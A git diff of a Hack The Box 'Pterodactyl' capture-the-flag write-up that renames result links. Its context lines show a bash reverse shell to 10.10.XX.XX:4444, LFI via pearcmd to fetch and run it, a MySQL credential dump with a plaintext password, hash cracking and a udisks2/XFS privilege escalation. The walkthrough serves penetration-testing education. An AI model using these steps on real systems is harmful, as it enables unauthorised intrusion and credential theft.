@@ -39,7 +39,7 @@ Initial port scanning reveals a standard web setup:
 
 ![Pterodactyl](htb_Pterodactyl_nmap.png)
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/nmap_results.nmap "Nmap Results")
+[Nmap Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/nmap_results.nmap "Nmap Results")
 
 ![Pterodactyl](htb_Pterodactyl_web_landing.png)
 
@@ -62,7 +62,7 @@ $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
 
 Further investigation of the panel reveals a `phpinfo.php` file, confirming that **PEAR** is installed and included in the PHP configuration. This is a significant finding, as it allows for `pearcmd` exploitation if LFI is present.
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/PHP.html "PHP pearcmd Results")
+[Subdomain Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/PHP.html "PHP pearcmd Results")
 
 ![Pterodactyl](htb_Pterodactyl_php.png)
 
@@ -94,7 +94,7 @@ echo "bash -i >& /dev/tcp/10.10.XX.XX/4444 0>&1" > rev.sh
 python3 -m http.server 8081
 ```
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/rev.sh "Reverse shell")
+[Reverse shell](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/rev.sh "Reverse shell")
 
 ![Pterodactyl](htb_Pterodactyl_connections.png)
 
@@ -102,11 +102,11 @@ python3 -m http.server 8081
 
 ![Pterodactyl](htb_Pterodactyl_LFI_DB_Cred.png)
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/dumpDB.txt "Dump Results")
+[Dump Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/dumpDB.txt "Dump Results")
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/pwn.txt "Informational Results")
+[Informational Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/pwn.txt "Informational Results")
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/User_flag.txt "Informational Results")
+[Informational Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/User_flag.txt "Informational Results")
 
 ### Staging the Downloader
 
@@ -125,7 +125,9 @@ We call the newly created `/tmp/shell.php` via the LFI to execute the `curl` com
 ```bash
 curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell"
 ```
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/Download_rev_sh.txt "Curl -> Donwload Hit at Python server")
+
+[Curl -> Donwload Hit at Python server](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/Download_rev_sh.txt "Curl -> Donwload Hit at Python server")
+
 ### Execution
 
 Finally, we overwrite `/tmp/shell.php` with a command to execute the downloaded `rev.sh` and trigger it again while listening on port 4444.
@@ -139,9 +141,9 @@ curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp
 
 ```
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/executor.txt  "Execution Results")
+[Execution Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/executor.txt  "Execution Results")
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/pop_Shell.txt "Shell Spawned")
+[Shell Spawned](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/pop_Shell.txt "Shell Spawned")
 
 
 ```Python
@@ -215,7 +217,7 @@ if __name__ == "__main__":
     exploit()
 ```
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/poc.py "POC")
+[POC](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/poc.py "POC")
 
 ![Pterodactyl](htb_Pterodactyl_POC.png)
 
@@ -270,7 +272,7 @@ DB_USERNAME=pterodactyl
 
 ![Pterodactyl](htb_Pterodactyl_phileas_30.png)
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/env.txt ".env")
+[.env](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/env.txt ".env")
 
 We use these credentials to dump the user table from the local MySQL instance to find credentials for a lateral move.
 
@@ -279,7 +281,7 @@ $ mysql -h 127.0.0.1 -u pterodactyl -p'PteraPanel' --batch --skip-column-names -
 
 ```
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/cred.txt "Credentials Dumped")
+[Credentials Dumped](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/cred.txt "Credentials Dumped")
 
 The dump provides an Argon2 hash (ID 3200) for the user `phileasfogg3`. After cracking this hash with **Hashcat**, we successfully transition to a full SSH session.
 
@@ -337,7 +339,7 @@ The core exploit involves a race condition in `udisks2` during a filesystem resi
 
 Modern kernels (like Kali) often drop support for **XFS V4 (Legacy)**, which the target requires. To circumvent this, we build the malicious image directly on the target or via a Docker container running an older Debian version.
 
-[Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/xfs.image.7z.001  " Compressed Malicious Image")
+[Compressed Malicious Image](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/xfs.image.7z.001  " Compressed Malicious Image")
 
 ![Pterodactyl](htb_Pterodactyl_xfs_img.png)
 
